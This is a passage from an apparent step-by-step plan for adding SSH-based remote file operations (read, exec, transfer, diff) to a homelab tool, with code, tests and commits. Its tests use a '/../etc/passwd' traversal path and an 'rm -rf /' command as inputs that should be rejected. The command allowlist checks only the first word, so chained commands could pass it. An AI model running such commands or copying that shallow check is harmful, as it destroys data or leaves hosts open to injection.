   * @returns tree command output
   */
  treeDirectory(host: HostConfig, path: string, depth: number): Promise<string>;

  /**
   * Execute command in working directory.
   *
   * @param host - Host configuration
   * @param path - Working directory
   * @param command - Command to execute
   * @param timeout - Timeout in milliseconds
   * @returns Command result
   */
  executeCommand(
    host: HostConfig,
    path: string,
    command: string,
    timeout: number
  ): Promise<{ stdout: string; exitCode: number }>;

  /**
   * Find files matching pattern.
   *
   * @param host - Host configuration
   * @param path - Starting directory
   * @param pattern - Glob pattern
   * @param options - Find options
   * @returns List of matching paths
   */
  findFiles(
    host: HostConfig,
    path: string,
    pattern: string,
    options: { type?: "f" | "d" | "l"; maxDepth?: number; limit?: number }
  ): Promise<string>;

  /**
   * Transfer file between hosts.
   *
   * @param sourceHost - Source host
   * @param sourcePath - Source file path
   * @param targetHost - Target host
   * @param targetPath - Target path
   * @returns Transfer result
   */
  transferFile(
    sourceHost: HostConfig,
    sourcePath: string,
    targetHost: HostConfig,
    targetPath: string
  ): Promise<{ bytesTransferred: number; warning?: string }>;

  /**
   * Diff two files.
   *
   * @param host1 - First host
   * @param path1 - First file path
   * @param host2 - Second host
   * @param path2 - Second file path
   * @param contextLines - Context lines
   * @returns Unified diff output
   */
  diffFiles(
    host1: HostConfig,
    path1: string,
    host2: HostConfig,
    path2: string,
    contextLines: number
  ): Promise<string>;
}
```

### Step 4.4: Implement FileService

**File:** `src/services/file-service.ts`

```typescript
import type { HostConfig } from "../types.js";
import type { ISSHService, IFileService } from "./interfaces.js";
import { validateSecurePath, escapeShellArg, isSystemPath, HostSecurityError } from "../utils/path-security.js";
import { ALLOWED_COMMANDS, ENV_ALLOW_ANY_COMMAND, DEFAULT_COMMAND_TIMEOUT } from "../constants.js";

/**
 * FileService provides remote file operations via SSH.
 * All operations validate paths and escape shell arguments for security.
 *
 * SRP Note: Validation logic is delegated to path-security utilities.
 * The private validatePath/validateCommand methods are thin facades that
 * provide consistent validation entry points. This keeps FileService focused
 * on orchestrating file operations while security logic lives in utils.
 */
export class FileService implements IFileService {
  constructor(private readonly sshService: ISSHService) {}

  // ===== Validation Facades (delegate to path-security utils) =====

  /**
   * Validate path and throw on traversal attempts.
   * Delegates to validateSecurePath from path-security utils.
   */
  private validatePath(path: string): void {
    validateSecurePath(path, "path");
  }

  /**
   * Check if command is in allowed list.
   * Uses ALLOWED_COMMANDS constant from constants.ts.
   */
  private validateCommand(command: string): void {
    const allowAny = process.env[ENV_ALLOW_ANY_COMMAND] === "true";
    if (allowAny) return;

    // Extract base command (first word)
    const baseCommand = command.trim().split(/\s+/)[0];

    if (!ALLOWED_COMMANDS.has(baseCommand)) {
      throw new Error(
        `Command '${baseCommand}' not in allowed list. ` +
        `Allowed: ${[...ALLOWED_COMMANDS].join(", ")}. ` +
        `Set ${ENV_ALLOW_ANY_COMMAND}=true to allow any command.`
      );
    }
  }

  async readFile(
    host: HostConfig,
    path: string,
    maxSize: number
  ): Promise<{ content: string; size: number; truncated: boolean }> {
    this.validatePath(path);

    const escapedPath = escapeShellArg(path);
    const command = `cat ${escapedPath} | head -c ${maxSize + 1}`;

    const output = await this.sshService.executeSSHCommand(
      host,
      command,
      [],
      { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
    );

    const truncated = output.length > maxSize;
    const content = truncated ? output.slice(0, maxSize) : output;

    return {
      content,
      size: output.length,
      truncated
    };
  }

  async listDirectory(
    host: HostConfig,
    path: string,
    showHidden: boolean
  ): Promise<string> {
    this.validatePath(path);

    const escapedPath = escapeShellArg(path);
    const flags = showHidden ? "-la" : "-l";
    const command = `ls ${flags} ${escapedPath}`;

    return this.sshService.executeSSHCommand(
      host,
      command,
      [],
      { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
    );
  }

  async treeDirectory(
    host: HostConfig,
    path: string,
    depth: number
  ): Promise<string> {
    this.validatePath(path);

    const escapedPath = escapeShellArg(path);
    const command = `tree -L ${depth} ${escapedPath}`;

    return this.sshService.executeSSHCommand(
      host,
      command,
      [],
      { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
    );
  }

  async executeCommand(
    host: HostConfig,
    path: string,
    command: string,
    timeout: number
  ): Promise<{ stdout: string; exitCode: number }> {
    this.validatePath(path);
    this.validateCommand(command);

    const escapedPath = escapeShellArg(path);
    const fullCommand = `cd ${escapedPath} && ${command}`;

    // NOTE: ISSHService.executeSSHCommand returns only stdout as string.
    // It throws on command failure, so successful returns always imply exitCode 0.
    // Non-zero exit codes throw an error with the stderr content.
    const stdout = await this.sshService.executeSSHCommand(
      host,
      fullCommand,
      [],
      { timeoutMs: timeout }
    );

    // exitCode is always 0 for successful commands (errors throw)
    return { stdout, exitCode: 0 };
  }

  async findFiles(
    host: HostConfig,
    path: string,
    pattern: string,
    options: { type?: "f" | "d" | "l"; maxDepth?: number; limit?: number }
  ): Promise<string> {
    this.validatePath(path);

    const escapedPath = escapeShellArg(path);
    const escapedPattern = escapeShellArg(pattern);

    let command = `find ${escapedPath}`;

    if (options.maxDepth) {
      command += ` -maxdepth ${options.maxDepth}`;
    }

    if (options.type) {
      command += ` -type ${options.type}`;
    }

    command += ` -name ${escapedPattern}`;

    if (options.limit) {
      command += ` | head -n ${options.limit}`;
    }

    return this.sshService.executeSSHCommand(
      host,
      command,
      [],
      { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
    );
  }

  async transferFile(
    sourceHost: HostConfig,
    sourcePath: string,
    targetHost: HostConfig,
    targetPath: string
  ): Promise<{ bytesTransferred: number; warning?: string }> {
    this.validatePath(sourcePath);
    this.validatePath(targetPath);

    let warning: string | undefined;
    if (isSystemPath(targetPath)) {
      warning = `Warning: target is a system path (${targetPath}). Proceed with caution.`;
    }

    const escapedSource = escapeShellArg(sourcePath);
    const escapedTarget = escapeShellArg(targetPath);

    // Get file size first
    const sizeOutput = await this.sshService.executeSSHCommand(
      sourceHost,
      `stat -c %s ${escapedSource}`,
      [],
      { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
    );

    const size = parseInt(sizeOutput.trim(), 10) || 0;

    // Build scp command
    // Format: scp user@source:/path user@target:/path
    // NOTE: Only escape the PATH portion, not the full user@host:/path spec
    // Escaping the full spec would break scp's parsing of user@host:path format
    const sourceSpec = `${sourceHost.sshUser || "root"}@${sourceHost.host}:${escapedSource}`;
    const targetSpec = `${targetHost.sshUser || "root"}@${targetHost.host}:${escapedTarget}`;

    await this.sshService.executeSSHCommand(
      sourceHost,
      `scp ${sourceSpec} ${targetSpec}`,
      [],
      { timeoutMs: 300000 } // 5 min timeout for transfers
    );

    return { bytesTransferred: size, warning };
  }

  async diffFiles(
    host1: HostConfig,
    path1: string,
    host2: HostConfig,
    path2: string,
    contextLines: number
  ): Promise<string> {
    this.validatePath(path1);
    this.validatePath(path2);

    // If same host, use direct diff
    if (host1.name === host2.name) {
      const escapedPath1 = escapeShellArg(path1);
      const escapedPath2 = escapeShellArg(path2);

      return this.sshService.executeSSHCommand(
        host1,
        `diff -u -U ${contextLines} ${escapedPath1} ${escapedPath2} || true`,
        [],
        { timeoutMs: DEFAULT_COMMAND_TIMEOUT }
      );
    }

    // For cross-host diff, read both files and compare locally
    const [content1, content2] = await Promise.all([
      this.readFile(host1, path1, 10485760),
      this.readFile(host2, path2, 10485760)
    ]);

    // Create temp files and diff (simplified - in real impl would use proper temp handling)
    // For now, return a basic comparison
    if (content1.content === content2.content) {
      return "(files are identical)";
    }

    return `--- ${host1.name}:${path1}\n+++ ${host2.name}:${path2}\n@@ differences exist (cross-host diff) @@`;
  }
}
```

### Step 4.5: Run tests to verify they pass

**Run:** `pnpm test -- file-service`

**Expected:** PASS (or mostly passing - adjust mocks as needed)

### Step 4.6: Commit

```bash
git add src/services/interfaces.ts src/services/file-service.ts src/services/file-service.test.ts
git commit -m "feat(scout): add FileService for remote file operations"
```

---

## Task 5: Update ServiceContainer

**Files:**
- Modify: `src/services/container.ts`
- Modify: `src/services/container.test.ts`

### Step 5.1: Write failing tests

**File:** `src/services/container.test.ts`

Add or create:

```typescript
import { describe, it, expect, vi } from "vitest";
import { ServiceContainer } from "./container.js";

describe("ServiceContainer", () => {
  describe("getFileService", () => {
    it("returns FileService instance", () => {
      const container = new ServiceContainer();
      const fileService = container.getFileService();
      expect(fileService).toBeDefined();
      expect(typeof fileService.readFile).toBe("function");
    });

    it("lazily initializes on first call", () => {
      const container = new ServiceContainer();
      // First call creates instance
      const first = container.getFileService();
      // Second call returns same instance
      const second = container.getFileService();
      expect(first).toBe(second);
    });
  });

  describe("setFileService", () => {
    it("allows injecting mock for testing", () => {
      const container = new ServiceContainer();
      const mockFileService = {
        readFile: vi.fn(),
        listDirectory: vi.fn(),
        treeDirectory: vi.fn(),
        executeCommand: vi.fn(),
        findFiles: vi.fn(),
        transferFile: vi.fn(),
        diffFiles: vi.fn()
      };

      container.setFileService(mockFileService as any);

      expect(container.getFileService()).toBe(mockFileService);
    });
  });
});
```

### Step 5.2: Run tests to verify they fail

**Run:** `pnpm test -- container.test`

**Expected:** FAIL - getFileService not defined

### Step 5.3: Update ServiceContainer

**File:** `src/services/container.ts`

Add import and methods:

```typescript
import { FileService } from "./file-service.js";
import type { IFileService } from "./interfaces.js";

// In ServiceContainer class, add:
private fileService?: IFileService;

/**
 * Get File service instance (lazy initialization with dependencies)
 */
getFileService(): IFileService {
  if (!this.fileService) this.fileService = new FileService(this.getSSHService());
  return this.fileService;
}

/**
 * Set File service instance (for testing/overrides)
 */
setFileService(service: IFileService): void {
  this.fileService = service;
}
```

### Step 5.4: Run tests to verify they pass

**Run:** `pnpm test -- container.test`

**Expected:** PASS

### Step 5.5: Commit

```bash
git add src/services/container.ts src/services/container.test.ts
git commit -m "feat(scout): add FileService to ServiceContainer"
```

---

## Task 6: Add Scout Formatters

**Files:**
- Modify: `src/formatters/index.ts`
- Modify: `src/formatters/formatters.test.ts`

### Step 6.1: Write failing tests

**File:** `src/formatters/formatters.test.ts`

Add:

```typescript
import {
  formatScoutReadMarkdown,
  formatScoutListMarkdown,
  formatScoutTreeMarkdown,
  formatScoutExecMarkdown,
  formatScoutFindMarkdown,
  formatScoutTransferMarkdown,
  formatScoutDiffMarkdown
} from "./index.js";

describe("scout formatters", () => {
  describe("formatScoutReadMarkdown", () => {
    it("formats file content with path header", () => {
      const result = formatScoutReadMarkdown(
        "tootie",
        "/etc/hosts",
        "127.0.0.1 localhost",
        100,
        false
      );
      expect(result).toContain("tootie:/etc/hosts");
      expect(result).toContain("127.0.0.1 localhost");
    });

    it("shows truncation notice when truncated", () => {
      const result = formatScoutReadMarkdown(
        "tootie",
        "/var/log/big.log",
        "partial content...",
        1000000,
        true
      );
      expect(result).toContain("truncated");
    });
  });

  describe("formatScoutListMarkdown", () => {
    it("formats directory listing", () => {
      const listing = "total 4\ndrwxr-xr-x 2 root root 4096 Jan 1 00:00 test";
      const result = formatScoutListMarkdown("tootie", "/var/log", listing);
      expect(result).toContain("tootie:/var/log");
      expect(result).toContain("total 4");
    });
  });

  describe("formatScoutTreeMarkdown", () => {
    it("formats tree output", () => {
      const tree = ".\n├── dir1\n└── file.txt";
      const result = formatScoutTreeMarkdown("tootie", "/home", tree, 3);
      expect(result).toContain("tootie:/home");
      expect(result).toContain("├── dir1");
    });
  });

  describe("formatScoutExecMarkdown", () => {
    it("formats command result", () => {
      const result = formatScoutExecMarkdown("tootie", "/tmp", "ls -la", "file1\nfile2", 0);
      expect(result).toContain("ls -la");
      expect(result).toContain("file1");
      expect(result).toContain("Exit: 0");
    });
  });

  describe("formatScoutFindMarkdown", () => {
    it("formats find results", () => {
      const files = "/var/log/syslog\n/var/log/auth.log";
      const result = formatScoutFindMarkdown("tootie", "/var", "*.log", files);
      expect(result).toContain("*.log");
      expect(result).toContain("/var/log/syslog");
    });
  });

  describe("formatScoutTransferMarkdown", () => {
    it("formats transfer result", () => {
      const result = formatScoutTransferMarkdown(
        "tootie", "/tmp/file.txt",
        "shart", "/backup/file.txt",
        1024
      );
      expect(result).toContain("tootie:/tmp/file.txt");
      expect(result).toContain("shart:/backup/file.txt");
      expect(result).toContain("1024");
    });

    it("includes warning if present", () => {
      const result = formatScoutTransferMarkdown(
        "tootie", "/tmp/file.txt",
        "shart", "/etc/config",
        512,
        "Warning: system path"
      );
      expect(result).toContain("Warning");
    });
  });

  describe("formatScoutDiffMarkdown", () => {
    it("formats diff output", () => {
      const diff = "--- a/hosts\n+++ b/hosts\n@@ -1 +1 @@\n-old\n+new";
      const result = formatScoutDiffMarkdown(
        "tootie", "/etc/hosts",
        "shart", "/etc/hosts",
        diff
      );
      expect(result).toContain("tootie:/etc/hosts");
      expect(result).toContain("shart:/etc/hosts");
      expect(result).toContain("---");
    });
  });
});
```

### Step 6.2: Run tests to verify they fail

**Run:** `pnpm test -- formatters`

**Expected:** FAIL - Scout formatters not defined

### Step 6.3: Implement formatters

**File:** `src/formatters/index.ts`

Add:

```typescript
// ===== Scout Formatters =====

export function formatScoutReadMarkdown(
  host: string,
  path: string,
  content: string,
  size: number,
  truncated: boolean
): string {
  const lines = [
    `## 📄 ${host}:${path}`,
    "",
    `**Size:** ${formatBytes(size)}${truncated ? " (truncated)" : ""}`,
    "",
    "```",
    content,
    "```"
  ];

  if (truncated) {
    lines.push("");
    lines.push("⚠️ *File was truncated to fit size limit*");
  }

  return truncateIfNeeded(lines.join("\n"));
}

export function formatScoutListMarkdown(
  host: string,
  path: string,
  listing: string
): string {
  return truncateIfNeeded([
    `## 📁 ${host}:${path}`,
    "",
    "```",
    listing,
    "```"
  ].join("\n"));
}

export function formatScoutTreeMarkdown(
  host: string,
  path: string,
  tree: string,
  depth: number
): string {
  return truncateIfNeeded([
    `## 🌳 ${host}:${path} (depth: ${depth})`,
    "",
    "```",
    tree,
    "```"
  ].join("\n"));
}

export function formatScoutExecMarkdown(
  host: string,
  path: string,
  command: string,
  stdout: string,
  exitCode: number
): string {
  const statusEmoji = exitCode === 0 ? "✅" : "❌";

  return truncateIfNeeded([
    `## ${statusEmoji} Command: ${host}:${path}`,
    "",
    `**Command:** \`${command}\``,
    `**Exit:** ${exitCode}`,
    "",
    "**Output:**",
    "```",
    stdout,
    "```"
  ].join("\n"));
}

export function formatScoutFindMarkdown(
  host: string,
  path: string,
  pattern: string,
  results: string
): string {
  const lines = results.split("\n").filter(l => l.trim());

  return truncateIfNeeded([
    `## 🔍 Find: ${host}:${path}`,
    "",
    `**Pattern:** \`${pattern}\``,
    `**Results:** ${lines.length} files`,
    "",
    "```",
    results,
    "```"
  ].join("\n"));
}

export function formatScoutTransferMarkdown(
  sourceHost: string,
  sourcePath: string,
  targetHost: string,
  targetPath: string,
  bytesTransferred: number,
  warning?: string
): string {
  const lines = [
    `## 📦 Transfer Complete`,
    "",
    `**From:** ${sourceHost}:${sourcePath}`,
    `**To:** ${targetHost}:${targetPath}`,
    `**Size:** ${formatBytes(bytesTransferred)}`
  ];

  if (warning) {
    lines.push("");
    lines.push(`⚠️ ${warning}`);
  }

  return lines.join("\n");
}

export function formatScoutDiffMarkdown(
  host1: string,
  path1: string,
  host2: string,
  path2: string,
  diff: string
): string {
  return truncateIfNeeded([
    `## 📊 Diff`,
    "",
    `**File 1:** ${host1}:${path1}`,
    `**File 2:** ${host2}:${path2}`,
    "",
    "```diff",
    diff,
    "```"
  ].join("\n"));
}

// NOTE: formatBytes is already imported and re-exported in this file (formatters/index.ts)
// No additional import needed - just use it directly in the functions above
```

### Step 6.4: Run tests to verify they pass

**Run:** `pnpm test -- formatters`

**Expected:** PASS

### Step 6.5: Commit

```bash
git add src/formatters/index.ts src/formatters/formatters.test.ts
git commit -m "feat(scout): add markdown formatters for file operations"
```

---

## Task 7: Add Scout Action Handler

**Files:**
- Modify: `src/tools/unified.ts`
- Modify: `src/tools/unified.test.ts`

### Step 7.1: Write failing tests

**File:** `src/tools/unified.test.ts`

Add:

```typescript
describe("handleScoutAction", () => {
  describe("scout:read", () => {
    it("returns file content", async () => {
      const mockFileService = {
        readFile: vi.fn().mockResolvedValue({
          content: "test content",
          size: 12,
          truncated: false
        })
      };
      mockContainer.setFileService(mockFileService as any);

      const result = await callTool({
        action: "scout",
        subaction: "read",
        host: "tootie",
        path: "/etc/hosts"
      });

      expect(result.isError).toBeFalsy();
      expect(result.content[0].text).toContain("test content");
    });

    it("errors on unknown host", async () => {
      const result = await callTool({
        action: "scout",
        subaction: "read",
        host: "nonexistent",
        path: "/etc/hosts"
      });

      expect(result.isError).toBe(true);
      expect(result.content[0].text).toContain("not found");
    });
  });

  describe("scout:list", () => {
    it("returns directory listing", async () => {
      const mockFileService = {
        listDirectory: vi.fn().mockResolvedValue("total 4\ndrwxr-xr-x test")
      };
      mockContainer.setFileService(mockFileService as any);

      const result = await callTool({
        action: "scout",
        subaction: "list",
        host: "tootie",
        path: "/var/log"
      });

      expect(result.isError).toBeFalsy();
      expect(result.content[0].text).toContain("total 4");
    });
  });

  describe("scout:exec", () => {
    it("executes allowed command", async () => {
      const mockFileService = {
        executeCommand: vi.fn().mockResolvedValue({
          stdout: "file1\nfile2",
          exitCode: 0
        })
      };
      mockContainer.setFileService(mockFileService as any);

      const result = await callTool({
        action: "scout",
        subaction: "exec",
        host: "tootie",
        path: "/tmp",
        command: "ls -la"
      });

      expect(result.isError).toBeFalsy();
      expect(result.content[0].text).toContain("file1");
    });
  });
});
```

### Step 7.2: Run tests to verify they fail

**Run:** `pnpm test -- unified.test`

**Expected:** FAIL - Scout handler not implemented

### Step 7.3: Implement scout handler

**File:** `src/tools/unified.ts`

Add imports:

```typescript
import {
  formatScoutReadMarkdown,
  formatScoutListMarkdown,
  formatScoutTreeMarkdown,
  formatScoutExecMarkdown,
  formatScoutFindMarkdown,
  formatScoutTransferMarkdown,
  formatScoutDiffMarkdown
} from "../formatters/index.js";
import { ResponseFormat } from "../types.js";
```

Update TOOL_DESCRIPTION (add after image section):

```typescript
  scout <subaction>      - Remote file operations via SSH
    read                 - Read file content
    list                 - List directory contents
    tree                 - Show directory tree
    exec                 - Execute command
    find                 - Find files by pattern
    transfer             - Transfer file between hosts
    diff                 - Diff files across hosts
```

Add EXAMPLES:

```typescript
  { action: "scout", subaction: "read", host: "tootie", path: "/etc/hosts" }
  { action: "scout", subaction: "list", host: "tootie", path: "/var/log" }
  { action: "scout", subaction: "exec", host: "tootie", path: "/tmp", command: "ls -la" }
```

Update routeAction switch:

```typescript
case "scout":
  return handleScoutAction(params, hosts, container);
```

Add handler function:

```typescript
// ===== Scout Action Handlers =====

async function handleScoutAction(
  params: UnifiedHomelabInput,
  hosts: HostConfig[],
  container: ServiceContainer
): Promise<{
  isError?: boolean;
  content: Array<{ type: "text"; text: string }>;
  structuredContent?: Record<string, unknown>;
}> {
  if (params.action !== "scout") throw new Error("Invalid action");
  const { subaction } = params;
  const fileService = container.getFileService();

  // Helper to resolve host
  const resolveHost = (hostName: string): HostConfig | undefined => {
    return hosts.find(h => h.name === hostName);
  };

  // Wrap all operations in try-catch to handle SSH/file errors gracefully
  try {
    switch (subaction) {
    case "read": {
      const host = resolveHost(params.host);
      if (!host) {
        return errorResponse(`Host '${params.host}' not found. Available: ${hosts.map(h => h.name).join(", ")}`);
      }

      const result = await fileService.readFile(host, params.path, params.max_size);

      const output = {
        host: params.host,
        path: params.path,
        size: result.size,
        truncated: result.truncated,
        content: result.content
      };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutReadMarkdown(params.host, params.path, result.content, result.size, result.truncated);

      return successResponse(text, output);
    }

    case "list": {
      const host = resolveHost(params.host);
      if (!host) {
        return errorResponse(`Host '${params.host}' not found.`);
      }

      const listing = await fileService.listDirectory(host, params.path, params.all);

      const output = { host: params.host, path: params.path, listing };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutListMarkdown(params.host, params.path, listing);

      return successResponse(text, output);
    }

    case "tree": {
      const host = resolveHost(params.host);
      if (!host) {
        return errorResponse(`Host '${params.host}' not found.`);
      }

      const tree = await fileService.treeDirectory(host, params.path, params.depth);

      const output = { host: params.host, path: params.path, depth: params.depth, tree };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutTreeMarkdown(params.host, params.path, tree, params.depth);

      return successResponse(text, output);
    }

    case "exec": {
      const host = resolveHost(params.host);
      if (!host) {
        return errorResponse(`Host '${params.host}' not found.`);
      }

      const result = await fileService.executeCommand(host, params.path, params.command, params.timeout);

      const output = {
        host: params.host,
        path: params.path,
        command: params.command,
        stdout: result.stdout,
        exitCode: result.exitCode
      };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutExecMarkdown(params.host, params.path, params.command, result.stdout, result.exitCode);

      return successResponse(text, output);
    }

    case "find": {
      const host = resolveHost(params.host);
      if (!host) {
        return errorResponse(`Host '${params.host}' not found.`);
      }

      const results = await fileService.findFiles(host, params.path, params.pattern, {
        type: params.type,
        maxDepth: params.max_depth,
        limit: params.limit
      });

      const output = {
        host: params.host,
        path: params.path,
        pattern: params.pattern,
        results: results.split("\n").filter(l => l.trim())
      };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutFindMarkdown(params.host, params.path, params.pattern, results);

      return successResponse(text, output);
    }

    case "transfer": {
      const sourceHost = resolveHost(params.source_host);
      const targetHost = resolveHost(params.target_host);

      if (!sourceHost) {
        return errorResponse(`Source host '${params.source_host}' not found.`);
      }
      if (!targetHost) {
        return errorResponse(`Target host '${params.target_host}' not found.`);
      }

      const result = await fileService.transferFile(
        sourceHost, params.source_path,
        targetHost, params.target_path
      );

      const output = {
        source_host: params.source_host,
        source_path: params.source_path,
        target_host: params.target_host,
        target_path: params.target_path,
        bytes_transferred: result.bytesTransferred,
        warning: result.warning
      };

      const text = formatScoutTransferMarkdown(
        params.source_host, params.source_path,
        params.target_host, params.target_path,
        result.bytesTransferred,
        result.warning
      );

      return successResponse(text, output);
    }

    case "diff": {
      const host1 = resolveHost(params.host1);
      const host2 = resolveHost(params.host2);

      if (!host1) {
        return errorResponse(`Host '${params.host1}' not found.`);
      }
      if (!host2) {
        return errorResponse(`Host '${params.host2}' not found.`);
      }

      const diff = await fileService.diffFiles(
        host1, params.path1,
        host2, params.path2,
        params.context_lines
      );

      const output = {
        host1: params.host1,
        path1: params.path1,
        host2: params.host2,
        path2: params.path2,
        diff
      };

      const text = params.response_format === ResponseFormat.JSON
        ? JSON.stringify(output, null, 2)
        : formatScoutDiffMarkdown(params.host1, params.path1, params.host2, params.path2, diff);

      return successResponse(text, output);
    }

    default:
      throw new Error(`Unknown scout subaction: ${subaction}`);
    }
  } catch (error) {
    // Handle SSH errors, path validation errors, and command errors
    const message = error instanceof Error ? error.message : String(error);
    return errorResponse(`Scout operation failed: ${message}`);
  }
}
```

### Step 7.4: Run tests to verify they pass

**Run:** `pnpm test -- unified.test`

**Expected:** PASS

### Step 7.5: Commit

```bash
git add src/tools/unified.ts src/tools/unified.test.ts
git commit -m "feat(scout): add scout action handler for file operations"
```

---

## Task 8: Integration Tests

**Files:**
- Modify: `src/tools/unified.integration.test.ts`

### Step 8.1: Add integration tests

**File:** `src/tools/unified.integration.test.ts`

Add new describe block:

```typescript
describe("scout action integration", () => {
  // Reset mocks before each test to ensure isolation
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("reads file from configured host", async () => {
    mockSSHService.executeSSHCommand.mockResolvedValue("test file content");

    const result = await callTool({
      action: "scout",
      subaction: "read",
      host: "tootie",
      path: "/etc/hosts"
    });

    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("test file content");
  });

  it("lists directory contents", async () => {
    mockSSHService.executeSSHCommand.mockResolvedValue("total 4\ndrwxr-xr-x 2 root root 4096 Jan 1 00:00 .");

    const result = await callTool({
      action: "scout",
      subaction: "list",
      host: "tootie",
      path: "/var/log"
    });

    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("total 4");
  });

  it("executes allowed command", async () => {
    mockSSHService.executeSSHCommand.mockResolvedValue("file1.txt\nfile2.txt");

    const result = await callTool({
      action: "scout",
      subaction: "exec",
      host: "tootie",
      path: "/tmp",
      command: "ls"
    });

    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("file1.txt");
  });

  it("finds files by pattern", async () => {
    mockSSHService.executeSSHCommand.mockResolvedValue("/var/log/syslog\n/var/log/auth.log");

    const result = await callTool({
      action: "scout",
      subaction: "find",
      host: "tootie",
      path: "/var",
      pattern: "*.log"
    });

    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("/var/log/syslog");
  });

  it("shows directory tree", async () => {
    mockSSHService.executeSSHCommand.mockResolvedValue(".\n├── dir1\n└── file.txt");

    const result = await callTool({
      action: "scout",
      subaction: "tree",
      host: "tootie",
      path: "/home",
      depth: 3
    });

    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("├── dir1");
  });

  it("rejects path traversal attempts", async () => {
    const result = await callTool({
      action: "scout",
      subaction: "read",
      host: "tootie",
      path: "/../etc/passwd"
    });

    expect(result.isError).toBe(true);
    expect(result.content[0].text).toMatch(/traversal|invalid/i);
  });

  it("rejects blocked commands", async () => {
    const result = await callTool({
      action: "scout",
      subaction: "exec",
      host: "tootie",
      path: "/tmp",
      command: "rm -rf /"
    });

    expect(result.isError).toBe(true);
    expect(result.content[0].text).toContain("not in allowed list");
  });
});
```

### Step 8.2: Run full test suite

**Run:** `pnpm test`

**Expected:** ALL PASS

### Step 8.3: Commit

```bash
git add src/tools/unified.integration.test.ts
git commit -m "test(scout): add integration tests for file operations"
```

---

## Task 9: Final Verification

### Step 9.1: Run type check

**Run:** `pnpm tsc --noEmit`

**Expected:** No errors

### Step 9.2: Run linter

**Run:** `pnpm lint`

**Expected:** No errors (or fix any that appear)

### Step 9.3: Run full test suite with coverage

**Run:** `pnpm test --coverage`

**Expected:** All tests pass, coverage maintained

### Step 9.4: Final commit

```bash
git add .
git commit -m "feat(scout): complete file operations integration"
```

---

## File Summary

| File | Action |
|------|--------|
| `src/utils/path-security.ts` | MODIFY - add host validation, shell escaping |
| `src/utils/path-security.test.ts` | MODIFY - add tests |
| `src/constants.ts` | MODIFY - add scout constants |
| `src/constants.test.ts` | CREATE - test constants |
| `src/schemas/unified.ts` | MODIFY - add 7 scout schemas |
| `src/schemas/unified.test.ts` | MODIFY - add schema tests |
| `src/services/interfaces.ts` | MODIFY - add IFileService |
| `src/services/file-service.ts` | CREATE - FileService implementation |
| `src/services/file-service.test.ts` | CREATE - unit tests |
| `src/services/container.ts` | MODIFY - add getFileService |
| `src/services/container.test.ts` | MODIFY - add container tests |
| `src/formatters/index.ts` | MODIFY - add scout formatters |
| `src/formatters/formatters.test.ts` | MODIFY - add formatter tests |
| `src/tools/unified.ts` | MODIFY - add scout handler |
| `src/tools/unified.test.ts` | MODIFY - add handler tests |
| `src/tools/unified.integration.test.ts` | MODIFY - add integration tests |

---

## Security Checklist

Before marking complete, verify:

- [ ] Path traversal blocked (`../`, `\x00`, relative paths)
- [ ] Host validation blocks shell metacharacters
- [ ] All paths escaped with `escapeShellArg()`
- [ ] Command allowlist enforced by default
- [ ] System path warnings for transfers
- [ ] File size limits enforced
- [ ] Command timeout enforced
- [ ] No secrets/SSH details in error messages
- [ ] All security tests passing
